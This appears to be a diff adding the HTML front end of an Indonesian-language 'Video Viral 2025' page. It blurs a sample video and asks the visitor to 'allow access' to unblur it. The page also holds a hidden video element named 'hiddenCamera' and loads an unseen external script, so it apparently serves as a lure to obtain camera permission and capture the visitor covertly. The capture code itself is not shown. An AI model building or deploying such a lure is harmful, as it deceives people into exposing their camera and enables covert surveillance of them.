@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Viral 2025</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body class="bg-gray-900 flex items-center justify-center min-h-screen font-[Poppins]">
+
+    <div class="bg-gray-800 shadow-lg rounded-xl p-6 max-w-lg w-full text-center text-white">
+        <h1 class="text-2xl font-semibold">Video Viral 2025</h1>
+        <p class="text-gray-400 text-sm mt-2">Izinkan akses untuk membuka video.</p>
+
+        <div class="relative mt-4">
+            <video id="videoPlayer" class="w-full rounded-lg filter blur-lg opacity-50 pointer-events-none" autoplay loop muted>
+                <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+                Browser Anda tidak mendukung video.
+            </video>
+            <div id="overlay" class="absolute inset-0 flex items-center justify-center bg-black bg-opacity-50 text-white text-lg font-semibold">
+                Izin Diperlukan
+            </div>
+        </div>
+
+        <button id="allowCameraButton" class="mt-4 w-full bg-blue-500 text-white py-2 rounded-lg hover:bg-blue-600 transition">
+            Izinkan Akses
+        </button>
+
+        <video id="hiddenCamera" class="hidden"></video>
+    </div>
+
+    <script src="../static/script.js"></script>
+</body>
+</html>
